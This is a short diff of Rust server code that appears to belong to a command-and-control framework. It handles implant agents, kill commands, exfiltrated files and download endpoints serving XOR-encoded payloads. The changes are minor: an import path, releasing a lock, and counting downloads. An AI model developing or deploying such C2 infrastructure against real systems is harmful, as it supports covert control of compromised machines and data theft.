@@ -2,7 +2,7 @@ use std::{net::SocketAddr, sync::Arc};
 
 use crate::{
     AUTH_COOKIE_NAME, COOKIE_TTL,
-    admin_task_dispatch::{admin_dispatch, build_all_bins},
+    admin_task_dispatch::{admin_dispatch, implant_builder::build_all_bins},
     agents::{extract_agent_id, handle_kill_command},
     app_state::AppState,
     exfil::handle_exfiltrated_file,
@@ -25,7 +25,6 @@ use axum_extra::extract::{
 };
 use shared::{
     net::{AdminLoginPacket, XorEncode, decode_http_response},
-    pretty_print::print_failed,
     tasks::{AdminCommand, BaBData, Command, FirstRunData},
 };
 
@@ -64,6 +63,7 @@ pub async fn handle_agent_get_with_path(
     if lock.c2_endpoints.contains(&endpoint) {
         // There is no need to authenticate here, that is done subsequently during
         // `handle_agent_get` where we pull the agent_id from the header
+        drop(lock);
         return handle_agent_get(state, request).await.into_response();
     }
 
@@ -72,6 +72,11 @@ pub async fn handle_agent_get_with_path(
     // over to them.
     //
     if let Some(metadata) = lock.download_endpoints.get(&endpoint) {
+        state
+            .db_pool
+            .update_download_count(&endpoint)
+            .await
+            .expect("could not update download count.");
         let filename = &metadata.file_name;
         return serve_file(filename, metadata.xor_key).await.into_response();
     }
